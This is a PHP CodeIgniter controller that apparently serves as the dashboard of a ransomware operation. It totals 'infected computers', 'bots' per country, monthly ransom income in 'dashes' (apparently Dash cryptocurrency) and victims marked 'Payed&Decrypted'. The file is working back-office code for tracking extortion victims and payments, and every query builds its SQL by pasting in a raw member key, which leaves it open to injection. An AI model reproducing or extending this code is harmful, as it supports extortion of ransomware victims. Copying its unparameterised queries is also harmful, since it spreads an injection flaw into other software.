<?php
/**
 * Created by PhpStorm.
 * User: wolf
 * Date: 10/6/14
 * Time: 2:26 AM
 */
if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class main extends CI_Controller {

    public $data;

    public function __construct(){
        parent::__construct();
        $this->login_model->login();
        // Page loading custom data
        $data = $this->lang_model->get_textdata();
        $data['page'] = 'dashboard';
        $data['theme_url'] = base_url().THEME_URL.CURRENT_THEME_NAME;
        $data['userdata'] = $this->login_model->get_cur_user_info();
        $data['menu_url'] = base_url()."index/menu";
        $data['title'] = "Dashboard";

        $this->data = $data;
    }

    public function index()
    {
        $this->data['userdata'] = $this->user_model->get_user($this->data['userdata']['member_id']);

        $this->data['earned_dashes'] = $this->getEarnedDashes();
        $this->data['infected_computers'] = $this->getInfectedComputers();

        $this->data['all_data'] = $this->getAllData($this->data['userdata']->member_key);
        $this->data['TopSales'] = $this->getTopSales($this->data['userdata']->member_key);
        // load view content
        $this->page_model->get_header($this->data);
        $this->page_model->get_sidebar($this->data);
        $this->page_model->get_content($this->data);
        $this->page_model->get_footer($this->data);
    }
    public function getTopSales($member_key){
        $CI =   & get_instance();
        $query = "select * from (SELECT country, count(*) as num, SUM(price) as sum FROM device_tb where owner='$member_key' GROUP BY country) as t order by t.sum desc ;";
        $results = $CI->db->query($query)->result();

//        echo json_encode($results);
        $earned_dashes = array();
        foreach($results as $result){
             $earned_dashes[] = (array)$result;
        }
        //print_r($earned_dashes);
//        var_dump($earned_dashes);
        return $earned_dashes;
    }
    public function getAllData($member_key){
        $CI =   & get_instance();
        
        $query = "SELECT SUM(price) as sum FROM device_tb where owner ='$member_key' ;";
        $results = $CI->db->query($query)->result();
        
        if(count($results) > 0)
           $all_dashes =  $results[0]->sum;
        else{
           $all_dashes =  0;
        }
        $query = "SELECT SUM(unread_msg) as sum FROM device_tb where owner ='$member_key' ;";
        $results = $CI->db->query($query)->result();
        
        if(count($results) > 0)
           $unread_msg =  $results[0]->sum;
        else{
           $unread_msg =  0;
        }
        $query = "SELECT count(*) as  sum FROM device_tb where owner ='$member_key' ;";
        $results = $CI->db->query($query)->result();
        if(count($results) > 0)
           $all_bots =  $results[0]->sum;
        else{
           $all_bots =  0;
        }


        $query = "SELECT count(*) as  sum,SUM(price) as prices FROM device_tb where owner ='$member_key' and status ='Payed&Decrypted';";
        $results = $CI->db->query($query)->result();
        if(count($results) > 0)
        {
            $paid_bots =  $results[0]->sum;
            $paid_dash =  $results[0]->prices;
        }   
        else{
            $paid_bots =  0;
            $paid_dash =  0;
        }

        $data = array('all_dash'=>$all_dashes
                 ,'unread_msg'=>$unread_msg
                 ,'all_bots'=>$all_bots
                  ,'paid_bots'=>$paid_bots
                   ,'paid_dash'=>$paid_dash
        );
        return $data;
    }

    public function getEarnedDashes(){
        $CI =   & get_instance();
        $query = "SELECT MONTH(from_unixtime(updatedAt,'%Y-%m-%d')) as month, SUM(price) as sum FROM device_tb where YEAR(from_unixtime(updatedAt,'%Y-%m-%d'))=YEAR(CURRENT_DATE()) GROUP BY YEAR(from_unixtime(updatedAt,'%Y-%m-%d')), MONTH(from_unixtime(updatedAt,'%Y-%m-%d'));";
        $results = $CI->db->query($query)->result();

//        echo json_encode($results);
        $earned_dashes = array(
            'JAN' => 0,
            'FEB' => 0,
            'MAR' => 0,
            'APR' => 0,
            'MAY' => 0,
            'JUN' => 0,
            'JUL' => 0,
            'AUG' => 0,
            'SEP' => 0,
            'OCT' => 0,
            'NOV' => 0,
            'DEC' => 0,
        );
        foreach($results as $result){
            switch($result->month){
                case 1:
                    $earned_dashes['JAN'] = $result->sum;
                    break;
                case 2:
                    $earned_dashes['FEB'] = $result->sum;
                    break;
                case 3:
                    $earned_dashes['MAR'] = $result->sum;
                    break;
                case 4:
                    $earned_dashes['APR'] = $result->sum;
                    break;
                case 5:
                    $earned_dashes['MAY'] = $result->sum;
                    break;
                case 6:
                    $earned_dashes['JUN'] = $result->sum;
                    break;
                case 7:
                    $earned_dashes['JUL'] = $result->sum;
                    break;
                case 8:
                    $earned_dashes['AUG'] = $result->sum;
                    break;
                case 9:
                    $earned_dashes['SEP'] = $result->sum;
                    break;
                case 10:
                    $earned_dashes['OCT'] = $result->sum;
                    break;
                case 11:
                    $earned_dashes['NOV'] = $result->sum;
                    break;
                case 12:
                    $earned_dashes['DEC'] = $result->sum;
                    break;
            }
        }
//        var_dump($earned_dashes);
        return $earned_dashes;
    }

    public function getInfectedComputers(){
        $CI =   & get_instance();
        $query = "SELECT MONTH(from_unixtime(updatedAt,'%Y-%m-%d')) as month, count(*) as sum FROM device_tb where YEAR(from_unixtime(updatedAt,'%Y-%m-%d'))=YEAR(CURRENT_DATE()) GROUP BY YEAR(from_unixtime(updatedAt,'%Y-%m-%d')), MONTH(from_unixtime(updatedAt,'%Y-%m-%d'));";
        $results = $CI->db->query($query)->result();

//        echo json_encode($results);
        $earned_dashes = array(
            'JAN' => 0,
            'FEB' => 0,
            'MAR' => 0,
            'APR' => 0,
            'MAY' => 0,
            'JUN' => 0,
            'JUL' => 0,
            'AUG' => 0,
            'SEP' => 0,
            'OCT' => 0,
            'NOV' => 0,
            'DEC' => 0,
        );
        foreach($results as $result){
            switch($result->month){
                case 1:
                    $earned_dashes['JAN'] = $result->sum;
                    break;
                case 2:
                    $earned_dashes['FEB'] = $result->sum;
                    break;
                case 3:
                    $earned_dashes['MAR'] = $result->sum;
                    break;
                case 4:
                    $earned_dashes['APR'] = $result->sum;
                    break;
                case 5:
                    $earned_dashes['MAY'] = $result->sum;
                    break;
                case 6:
                    $earned_dashes['JUN'] = $result->sum;
                    break;
                case 7:
                    $earned_dashes['JUL'] = $result->sum;
                    break;
                case 8:
                    $earned_dashes['AUG'] = $result->sum;
                    break;
                case 9:
                    $earned_dashes['SEP'] = $result->sum;
                    break;
                case 10:
                    $earned_dashes['OCT'] = $result->sum;
                    break;
                case 11:
                    $earned_dashes['NOV'] = $result->sum;
                    break;
                case 12:
                    $earned_dashes['DEC'] = $result->sum;
                    break;
            }
        }
//        var_dump($earned_dashes);
        return $earned_dashes;
    }

    public function ajax_call(){
        /**
         * Get Ajax Request Parameters
         */
        //ajax call
        $action  =   $this->input->get_post('action') ;
        $data   =   $this->input->get_post('data');
        if($action === "get_all_data"){
             $userdata = $this->user_model->get_user($this->data['userdata']['member_id']);
            $all_data = $this->getAllData($userdata->member_key);

             echo  json_encode($all_data);
            die();
        }
        require_once FCPATH."ui/server/pages/dashboard.php";
    }

}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */
